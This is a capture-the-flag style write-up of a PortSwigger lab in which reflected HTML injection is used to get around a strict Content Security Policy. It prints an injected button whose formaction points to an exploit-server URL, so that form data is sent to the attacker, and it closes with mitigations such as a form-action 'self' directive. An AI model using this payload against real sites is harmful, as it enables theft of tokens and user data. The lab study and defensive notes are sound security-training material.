# Lab29 - Reflected XSS Protection With CSP, Exploited Via Dangling Markup

## Objective

Exploit a Dangling Markup vulnerability to capture sensitive information despite a strict Content Security Policy (CSP).

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Dangling Markup |
| Difficulty | Practitioner |
| Impact | Information Disclosure |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application reflects user input into the page.

A strict CSP blocks:

```html
<script>
```

execution.

Traditional XSS payloads fail.

However:

```text
Dangling Markup
```

can still be used to exfiltrate data.

---

# Analysis

## Initial Observation

Application implements:

```http
Content-Security-Policy
```

which prevents JavaScript execution.

---

## Problem

Normal payload:

```html
<script>alert(1)</script>
```

fails.

---

## Key Realization

Need:

```text
HTML Injection
```

instead of:

```text
JavaScript Injection
```

---

## Goal

Capture sensitive data from the page.

---

# Full Payload Used

```html
"><button
formaction="https://exploit-server.exploit-server.net/exploit"
formmethod="GET">
Click Me
</button>
```

---

# Why The Payload Works

Execution Flow:

```text
HTML Injection
        ↓
Create Malicious Button
        ↓
Victim Clicks Button
        ↓
Sensitive Data Sent To Attacker
```

---

# Exploitation Steps

## Step 1

Identify reflection point.

---

## Step 2

Confirm CSP blocks scripts.

---

## Step 3

Inject malicious form element.

---

## Step 4

Point request to exploit server.

---

## Step 5

Capture leaked information.

---

# Personal Analysis & Testing Process

## Initial Thought

Attempt standard XSS.

---

## Problem

Strict CSP prevented:

```html
<script>
```

execution.

---

## Observation

HTML injection still possible.

---

## Strategy

Use:

```html
formaction
```

to redirect form submission.

---

## Result

Sensitive page content successfully leaked.

Lab solved.

---

# Mitigation

Implement:

```text
Context-Aware Output Encoding
```

---

Restrict:

```html
formaction
```

modification.

---

Use:

```http
form-action 'self'
```

in CSP.

---

# Related Theory

- 39-dangling-markup-injection.md
- 40-content-security-policy-csp.md
- 41-mitigating-dangling-markup-using-csp.md

---

# Key Learnings

- CSP does not stop all injection attacks.
- Dangling Markup requires no JavaScript.
- Information disclosure can occur without XSS execution.